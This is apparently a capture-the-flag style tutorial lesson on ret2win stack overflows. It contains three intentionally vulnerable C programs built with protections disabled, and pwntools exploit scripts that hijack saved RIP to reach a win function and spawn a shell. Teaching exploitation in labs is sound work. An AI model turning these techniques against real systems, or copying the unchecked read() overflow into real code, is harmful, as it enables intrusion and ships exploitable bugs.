---
title: "Lesson 3.4: A ret2win Lab, Three Challenges From Easy to Hard"
image:
  path: /assets/img/covers/pwn-3-4-ret2win-lab-easy-hard.webp
  alt: "A ret2win Lab, Three Challenges From Easy to Hard"
date: 2026-10-10 11:20:00 +0700
categories: ["Binary Exploitation", "Pwn · Buffer Overflow"]
tags: [pwn, ret2win, rop, lab]
render_with_liquid: false
---

The last three lessons gave you enough tools: measure the offset, overwrite saved RIP, load an argument with pop rdi, align the stack. This lesson is the practice ground. Three ret2win challenges of increasing difficulty, each with full C source, the exact build command, and a working solve script. Clear all three and you can exploit this basic class of stack overflow with confidence.

![Three ret2win stack layouts side by side: no argument, one argument, two arguments](/assets/img/pwn/pwn-3-4-ret2win-lab-easy-hard.svg)
_Challenge 1 jumps straight into win, challenge 2 loads one argument, challenge 3 loads two and aligns the stack._

**Part:** 3 · **Lab time:** ~90 minutes · **Difficulty:** medium

**Prerequisites:** Lesson 3.1, 3.2, 3.3. You need to be able to do the operations from those three lessons without constantly flipping back.

**Tools:** gcc, gdb + pwndbg, pwntools, ROPgadget. Reference environment: Ubuntu 24.04, glibc 2.39, gcc 13.3.

## Goals

By the end of this lesson you have built and fully solved three ret2win challenges of increasing difficulty, you are comfortable with the workflow (checksec, measure offset, find gadgets, build the chain, get a shell), you can handle a challenge that needs two arguments (pop rdi plus pop rsi) and alignment, and you have a set of reusable scripts for every later stack lesson.

## Theory

### The standard workflow for every stack challenge

The three challenges below differ in detail, but the workflow is identical. Memorizing this workflow matters more than memorizing specific numbers.

1. Run `checksec` to know the mitigations. All three challenges here are No PIE, No canary, NX on (the challenge style).
2. Read the source (or reverse it) to find the target function and the winning condition.
3. Measure the offset to saved RIP with cyclic.
4. If the target function needs arguments, find gadgets (`pop rdi`, `pop rsi`...) with ROPgadget.
5. Build the payload: padding to saved RIP, then the gadget chain and the target function.
6. If the target function calls `system`/`printf` and runs then crashes, add or remove a `ret` gadget to align the stack to 16 bytes.
7. Call `interactive()` once you have a shell.

### The shared compile command

All challenges compile with the same set of flags, deliberately left open so you focus on the technique.

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -O0 -o <name> <name>.c
```

What the flags do.

- `-fno-stack-protector`: disables the stack canary. Without a canary, an overflow reaches saved RIP unobstructed.
- `-no-pie`: disables PIE. The binary loads at a fixed address (base `0x400000`), so `elf.sym[...]` gives an absolute address you can use directly, no leak needed.
- `-fcf-protection=none`: disables CET/endbr. On Ubuntu 24.04 gcc enables `-fcf-protection` by default, inserting `endbr64` at the start of functions; turning it off keeps gadgets clean, so ROPgadget finds `pop rdi ; ret` and bare `ret` more easily.
- `-O0`: no optimization, to keep the stack frame readable and matching the source.

NX stays on by default (no `-z execstack`), matching the spirit of this lesson, since we reuse existing code and don't inject shellcode.

## Demo

Test environment: Ubuntu 24.04, glibc 2.39, gcc 13.3. Every measurement and output below is real. The source, build script, exploit, and transcript are in the Lab section below.

This section walks through challenge 1 completely, the other two are left for you in the Lab section (with reference scripts).

### Challenge 1: ret2win with no argument (easy)

```c
// chall1.c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
void win(void){
    char f[64]; int fd=open("flag.txt",O_RDONLY);
    if(fd<0){puts("no flag.txt");_exit(1);}
    int n=read(fd,f,64); write(1,"Flag: ",6); write(1,f,n); _exit(0);
}
void vuln(void){ char buf[48]; puts("chall1>"); read(0,buf,200); }
int main(void){ setvbuf(stdout,0,_IONBF,0); vuln(); return 0; }
```

Compile it and set up a fake flag.

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -O0 -o chall1 chall1.c
echo 'FLAG{ret2win_level_cleared}' > flag.txt
```

checksec confirms the configuration, so measure the offset with cyclic.

```python
from pwn import *
open('pat.txt','wb').write(cyclic(150))
```

```gdb
pwndbg> run < pat.txt
pwndbg> cyclic -l $rsp
56
```

The offset is 56 (buf[48] plus 8 bytes of saved RBP). `win` uses raw syscalls so you can jump straight into it without hitting movaps. Here is the solve script.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall1')
io = process('./chall1')
io.sendafter(b'chall1>\n', flat(b'A'*56, elf.sym['win']))
print(io.recvall(timeout=2).decode())
```

Running it gives `Flag: FLAG{ret2win_level_cleared}`, and challenge 1 is done.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 3.4</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/3.4.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/chall1.c" download><i class="fa-solid fa-file-code"></i>chall1.c</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/chall2.c" download><i class="fa-solid fa-file-code"></i>chall2.c</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/chall3.c" download><i class="fa-solid fa-file-code"></i>chall3.c</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/exp_chall1.py" download><i class="fa-solid fa-file-code"></i>exp_chall1.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/exp_chall2.py" download><i class="fa-solid fa-file-code"></i>exp_chall2.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/exp_chall3.py" download><i class="fa-solid fa-file-code"></i>exp_chall3.py</a>
<a class="lab-file" href="/assets/labs-pwn/3.4/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
</div>
</div>

### Challenge 2: ret2win with one argument (medium)

```c
// chall2.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__asm__(".global g\n g:\n pop %rdi\n ret\n");    // planted pop rdi ; ret gadget
void win(unsigned long k){
    if(k==0xcafed00d){ puts("[+] ok"); system("/bin/sh"); }
    else printf("[-] k=0x%lx\n",k);
}
void vuln(void){ char buf[32]; puts("chall2>"); read(0,buf,200); }
int main(void){ setvbuf(stdout,0,_IONBF,0); vuln(); return 0; }
```

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -O0 -o chall2 chall2.c
```

The task is to pass `k == 0xcafed00d` then get a shell. `win` calls `system`, so watch for movaps.

Here is a reference script, try it yourself first.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall2')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

io = process('./chall2')
io.sendafter(b'chall2>\n', flat(
    b'A'*40,                  # offset measured with cyclic: 40 (buf[32] + 8)
    pop_rdi, 0xcafed00d,
    ret,                      # align the stack to 16 bytes
    elf.sym['win'],
))
io.interactive()
```

The offset in chall2 is 40. The `pop rdi ; ret` gadget is at `0x401166`, `ret` at `0x40101a`, `win` at `0x401168` (or let `ROP`/`elf.sym` fetch these for you instead of hardcoding).

### Challenge 3: ret2win with two arguments (harder)

```c
// chall3.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__asm__(
    ".global gadgets\n"
    ".type gadgets, @function\n"
    "gadgets:\n"
    "    pop %rdi\n"
    "    ret\n"
    "    pop %rsi\n"
    "    ret\n"
);
void win(unsigned long a, unsigned long b){
    if(a==0xc0ffee && b==0x1337){ puts("[+] both arguments correct. Shell:"); system("/bin/sh"); }
    else printf("[-] wrong: a=0x%lx b=0x%lx\n", a, b);
}
void vuln(void){ char buf[40]; puts("Enter:"); read(0,buf,200); }
int main(void){ setvbuf(stdout,0,_IONBF,0); vuln(); return 0; }
```

```bash
gcc -fno-stack-protector -no-pie -fcf-protection=none -O0 -o chall3 chall3.c
```

The task is `a == 0xc0ffee` (into rdi) and `b == 0x1337` (into rsi), then get a shell. You need two gadgets, `pop rdi ; ret` and `pop rsi ; ret`.

Here is a reference script.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall3')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

io = process('./chall3')
io.sendafter(b'Enter:\n', flat(
    b'A'*56,                  # offset measured with cyclic: 56 (buf[40] plus padding and rbp)
    pop_rdi, 0xc0ffee,        # a -> rdi
    pop_rsi, 0x1337,          # b -> rsi
    ret,                      # align the stack to 16 bytes
    elf.sym['win'],
))
io.interactive()
```

The offset in chall3 is 56 (buf[40] but the frame is aligned, the extra is padding plus saved RBP). Gadgets: `pop rdi ; ret` at `0x401166`, `pop rsi ; ret` at `0x401168`, `ret` at `0x40101a`, `win` at `0x40116a`.

Hints, in tiers, shared across all three challenges.

- Hint 1: always start by measuring the offset. Do not trust the buffer size in the source, the compiler adds padding. chall1=56, chall2=40, chall3=56 are the real measurements on the reference environment; if your machine differs, measure again with cyclic.
- Hint 2: for a challenge calling `system`, if you see a success line then a crash, that's movaps. Add or remove one `ret`. chall2 and chall3 both need one `ret` before `win` on the reference environment, but the parity can flip if your chain is different.
- Hint 3: loading multiple registers: each pair is [pop gadget address][value]. Load rdi then rsi, order does not matter as long as each pop gadget gets the right value right after it. The `pop rsi ; ret` gadget here sits right after `pop rdi ; ret` (`0x401168` versus `0x401166`), so jumping into `0x401166` would pop both registers if you are not careful. Use the exact addresses `ROP` returns to avoid them bleeding into each other.

Check yourself on all three.

- chall1: what offset did you measure, how far from buf[48]?
- chall2: do you need the `ret` for alignment, and why?
- chall3: if you loaded rsi before rdi, would the payload still be correct?

The real result, run in the Lab section below on Ubuntu 24.04, glibc 2.39, gcc 13.3, shows offsets measured with cyclic of chall1=56, chall2=40, and chall3=56. Running `python3 exploit.py` (a driver that runs all three) gives this output.

```
exp_chall1.py -> Flag: FLAG{ret2win_level_cleared}
exp_chall2.py -> ===SHELL_OK===  uid=0(root) gid=0(root) groups=0(root)
exp_chall3.py -> ===SHELL_OK===  uid=0(root) gid=0(root) groups=0(root)
```

chall2 and chall3 both need exactly one `ret` gadget for alignment before `win`. The full transcript is in the Lab section below.

### Extra challenge (optional)

- Rewrite all three challenges with one `conn()` using `args.REMOTE` to switch between local and remote with a single environment variable, then set up a server with `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./chall1` and attack it through `remote('127.0.0.1', 1337)`.
- Try compiling chall1 without `-no-pie` (with PIE enabled) and see where the exploit breaks. You will understand why Part 5 teaches address leaking.

## Key takeaways

- A fixed workflow: checksec, read the source, measure the offset, find gadgets, build the chain, align the stack, interactive.
- The challenge-style compile command: `-fno-stack-protector -no-pie -O0`.
- Always measure the offset with cyclic, never trust the buffer size in the source.
- A target function with arguments: pop rdi (argument 1), pop rsi (argument 2).
- Calling system and crashing right after: add or remove one `ret` for 16-byte alignment.
- Use `elf.sym`/`ROP(...)` to get addresses instead of hardcoding.

## Common pitfalls

- Copying someone else's offset: the number depends on the compiler and the flags. This lesson records measurements on Ubuntu 24.04 gcc 13.3; a different build may differ. Always measure with cyclic yourself.
- Forgetting to create flag.txt before testing locally: chall1 will print "no flag.txt". Create a fake file first.
- Mixing up pop rsi with pop rdi: in chall3 the two gadgets sit right next to each other, jumping to the wrong address pops the wrong number of registers. Use the addresses `ROP` returns, don't compute them yourself.
- movaps sometimes needed, sometimes not: RSP parity changes with the number of 8-byte elements in the chain. A one-argument challenge and a two-argument challenge have different parity, so one needs `ret` and the other might not. Try both when unsure.
- Using `sendline` when the program reads with `read`: use `send`/`sendafter`. The extra `\n` byte is harmless here since it lands after the payload, but build the right habit.
- Local works, remote fails: these three are No PIE and self-contained, so this is rare. If it happens, check that the binary on the server really matches the one you are analyzing.

## Further reading

- ROP Emporium (ropemporium.com): work through the full `ret2win`, `split`, `callme` set to build fluency.
- picoCTF, the Binary Exploitation category: plenty of real ret2win challenges.
- pwn.college, the Program Interaction and Memory Errors modules.
